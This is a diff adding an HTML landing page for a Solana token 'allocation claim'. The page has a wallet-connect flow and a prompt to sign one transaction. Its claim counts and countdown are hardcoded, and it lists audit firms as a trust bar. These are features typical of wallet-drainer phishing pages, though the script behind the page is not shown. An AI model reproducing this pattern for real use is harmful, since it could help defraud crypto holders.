@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Echelon Protocol — Token Distribution</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/style.css">
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.0/lib/index.iife.min.js"></script>
+</head>
+<body>
+  <div class="bg-mesh"></div>
+  <div class="noise"></div>
+
+  <nav class="nav">
+    <a href="#" class="brand">
+      <span class="brand-mark">E</span>
+      <span class="brand-text">Echelon</span>
+    </a>
+    <div class="nav-links">
+      <a href="#">Docs</a>
+      <a href="#">Tokenomics</a>
+      <a href="#">Community</a>
+    </div>
+  </nav>
+
+  <main class="hero">
+    <div class="hero-copy">
+      <span class="eyebrow">Early Supporter Allocation</span>
+      <h1>Claim your Echelon allocation</h1>
+      <p class="subhead">A retroactive distribution for wallets that participated in the Solana ecosystem before mainnet.</p>
+    </div>
+
+    <div class="claim-card">
+      <div class="card-glow"></div>
+      <div class="card-header">
+        <div class="live-dot"><span></span> Distribution live</div>
+        <div class="countdown" id="countdown">23:14:08</div>
+      </div>
+
+      <div class="stats-row">
+        <div class="stat"><strong id="claimedCount">12,847</strong><span>Claims</span></div>
+        <div class="stat"><strong id="remainingCount">2,153</strong><span>Remaining</span></div>
+      </div>
+
+      <div id="connectSection" class="step">
+        <button id="btnConnect" class="btn btn-primary" disabled>
+          <span class="btn-text">Loading...</span>
+        </button>
+        <p class="loading-msg" id="loadingMsg">Initializing wallet libraries...</p>
+      </div>
+
+      <div id="connectedSection" class="step" style="display:none">
+        <div class="wallet-badge">
+          <span class="dot"></span>
+          <span id="walletAddr">—</span>
+          <span class="tag">Connected</span>
+        </div>
+
+        <label class="terms" id="agreeSection">
+          <input type="checkbox" id="chkAgree">
+          <span>I verify my on-chain activity and sign a single transaction to claim my allocation.</span>
+        </label>
+
+        <button id="btnClaim" class="btn btn-primary" disabled>
+          <span class="btn-text">Agree to terms</span>
+        </button>
+
+        <div id="statusBox" class="status" style="display:none"></div>
+        <div id="errorBox" class="error" style="display:none"></div>
+      </div>
+
+      <div class="trust-bar">
+        <span>Audited by</span>
+        <div class="badges">
+          <span>OtterSec</span>
+          <span>Neodyme</span>
+          <span>DefiLlama</span>
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <p>&copy; 2026 Echelon Protocol. Permissionless infrastructure for everyone.</p>
+    </footer>
+  </main>
+
+  <script src="/assets/app.js"></script>
+</body>
+</html>
